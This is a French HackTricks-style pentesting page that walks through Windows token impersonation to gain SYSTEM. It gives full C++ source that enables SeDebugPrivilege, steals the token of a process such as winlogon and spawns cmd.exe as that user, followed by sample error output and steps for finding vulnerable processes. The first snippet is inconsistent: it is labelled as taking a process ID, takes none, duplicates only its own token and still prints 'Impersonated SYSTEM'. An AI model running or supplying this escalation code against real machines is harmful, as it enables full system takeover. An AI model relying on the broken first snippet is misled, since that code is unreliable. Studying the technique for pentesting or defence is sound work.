<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une entreprise de **cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


## Code

Le code suivant a été copié à partir de [ici](https://medium.com/@seemant.bisht24/understanding-and-abusing-access-tokens-part-ii-b9069f432962).
Il permet d'**indiquer un ID de processus en argument** et une CMD **exécutée en tant qu'utilisateur** du processus indiqué sera exécutée.\
En exécutant dans un processus de haute intégrité, vous pouvez **indiquer l'ID du processus en cours d'exécution en tant que système** (comme winlogon, wininit) et exécuter un cmd.exe en tant que système.
```cpp
impersonateuser.exe 1234
```
{% code title="impersonateuser.cpp" %}
```cpp
#include <windows.h>
#include <stdio.h>

BOOL ImpersonateSystem()
{
    HANDLE hToken;
    BOOL bResult = FALSE;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        TOKEN_PRIVILEGES tp;
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid))
        {
            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
            {
                HANDLE hNewToken;

                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken))
                {
                    if (ImpersonateLoggedOnUser(hNewToken))
                    {
                        bResult = TRUE;
                    }

                    CloseHandle(hNewToken);
                }
            }
        }

        CloseHandle(hToken);
    }

    return bResult;
}

int main()
{
    if (ImpersonateSystem())
    {
        printf("Impersonated SYSTEM\n");
    }
    else
    {
        printf("Failed to impersonate SYSTEM\n");
    }

    return 0;
}
```
{% endcode %}
```cpp
#include <windows.h>
#include <iostream>
#include <Lmcons.h>
BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;
	// Enable the privilege or disable all privileges.
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}
	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}
	return TRUE;
}
std::string get_username()
{
	TCHAR username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserName(username, &username_len);
	std::wstring username_w(username);
	std::string username_s(username_w.begin(), username_w.end());
	return username_s;
}
int main(int argc, char** argv) {
	// Print whoami to compare to thread later
	printf("[+] Current user is: %s\n", (get_username()).c_str());
	// Grab PID from command line argument
	char* pid_c = argv[1];
	DWORD PID_TO_IMPERSONATE = atoi(pid_c);
	// Initialize variables and structures
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);
	// Add SE debug privilege
	HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, L"SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}
	// Call OpenProcess(), print return code and error code
	HANDLE processHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, PID_TO_IMPERSONATE);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, MAXIMUM_ALLOWED, &tokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	// Impersonate user in a thread
	BOOL impersonateUser = ImpersonateLoggedOnUser(tokenHandle);
	if (GetLastError() == NULL)
	{
		printf("[+] ImpersonatedLoggedOnUser() success!\n");
		printf("[+] Current user is: %s\n", (get_username()).c_str());
		printf("[+] Reverting thread to original user context\n");
		RevertToSelf();
	}
	else
	{
		printf("[-] ImpersonatedLoggedOnUser() Return Code: %i\n", getToken);
		printf("[-] ImpersonatedLoggedOnUser() Error: %i\n", GetLastError());
	}
	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}
	// Call CreateProcessWithTokenW(), print return code and error code
	BOOL createProcess = CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &startupInfo, &processInformation);
	if (GetLastError() == NULL)
		printf("[+] Process spawned!\n");
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}
	return 0;
}
```
{% endcode %}

## Erreur

Dans certaines occasions, vous pouvez essayer de vous faire passer pour System et cela ne fonctionnera pas, affichant une sortie comme celle-ci :
```cpp
[+] OpenProcess() success!
[+] OpenProcessToken() success!
[-] ImpersonatedLoggedOnUser() Return Code: 1
[-] ImpersonatedLoggedOnUser() Error: 5
[-] DuplicateTokenEx() Return Code: 0
[-] DupicateTokenEx() Error: 5
[-] CreateProcessWithTokenW Return Code: 0
[-] CreateProcessWithTokenW Error: 1326
```
Cela signifie que même si vous êtes en cours d'exécution avec un niveau d'intégrité élevé, vous n'avez pas suffisamment de permissions. Vérifions les autorisations actuelles de l'administrateur sur les processus `svchost.exe` avec **Process Explorer** (ou vous pouvez également utiliser Process Hacker) :

1. Sélectionnez un processus de `svchost.exe`
2. Clic droit --> Propriétés
3. À l'intérieur de l'onglet "Sécurité", cliquez en bas à droite sur le bouton "Autorisations"
4. Cliquez sur "Avancé"
5. Sélectionnez "Administrateurs" et cliquez sur "Modifier"
6. Cliquez sur "Afficher les autorisations avancées"

![](<../../.gitbook/assets/image (322).png>)

L'image précédente contient tous les privilèges dont disposent les "Administrateurs" sur le processus sélectionné (comme vous pouvez le voir dans le cas de `svchost.exe`, ils n'ont que des privilèges de "Consultation").

Voyons les privilèges que les "Administrateurs" ont sur `winlogon.exe` :

![](<../../.gitbook/assets/image (323).png>)

À l'intérieur de ce processus, les "Administrateurs" peuvent "Lire la mémoire" et "Lire les autorisations", ce qui leur permet probablement d'usurper le jeton utilisé par ce processus.
